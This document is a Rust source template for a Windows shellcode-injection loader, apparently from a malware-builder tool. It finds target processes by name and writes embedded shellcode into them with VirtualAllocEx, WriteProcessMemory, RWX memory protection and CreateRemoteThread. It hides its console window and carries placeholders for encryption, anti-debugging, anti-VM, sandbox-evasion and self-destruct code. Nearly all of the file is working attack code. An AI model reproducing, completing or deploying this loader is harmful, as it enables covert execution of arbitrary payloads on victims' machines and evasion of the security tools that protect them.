#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(unused_imports)]

use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::VirtualAllocEx;
use windows::Win32::System::Memory::VirtualProtectEx;
use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use windows::Win32::System::Threading::CreateRemoteThread;
use windows::Win32::System::Threading::OpenProcess;
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
use std::include_bytes;

{{ENCRYPTION_IMPORTS}}
{{ANTIDEBUG_IMPORTS}}
{{VM_IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DEOBFUSCATION_IMPORTS}}

{{ANTIDEBUG_FUNCTION}}
{{VM_FUNCTION}}
{{SANDBOX_FUNCTION}}
{{DECRYPTION_FUNCTION}}
{{DEOBFUSCATION_FUNCTION}}

fn boxboxbox(tar: &str) -> Vec<usize> {
    // search for processes to inject into
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
    }
    return dom;
}

fn enhance(buf: Vec<u8>, tar: usize) {
    // injecting in target processes :)
    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, tar as u32).unwrap();
        let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let mut byteswritten = 0;
        let _resb = WriteProcessMemory(
            h_process,
            result_ptr,
            buf.as_ptr() as _,
            buf.len(),
            Some(&mut byteswritten),
        );
        let mut old_perms = PAGE_EXECUTE_READWRITE;
        let _bool = VirtualProtectEx(
            h_process,
            result_ptr,
            buf.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_perms,
        );
        let _res_crt = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute(result_ptr)),
            None,
            0,
            None,
        )
            .unwrap();
    }
}

fn main() {

    {{SELF-DESTROY}}
    {{DEBUG_PRIVILEGE}}
    {{VM}}
    {{SANDBOX}}
    {{ANTIDEBUG}}

    // inject in the following processes:
    let tar: &str = "{{TARGET_PROCESS}}";
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let list: Vec<usize> = boxboxbox(tar);
    if list.len() == 0 {
        //panic!("[-] Unable to find a process.")
        std::process::exit(0);
    } else {
        for i in &list {

            {{DEOBFUSCATION}}
            {{DECRYPTION}}

            enhance(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}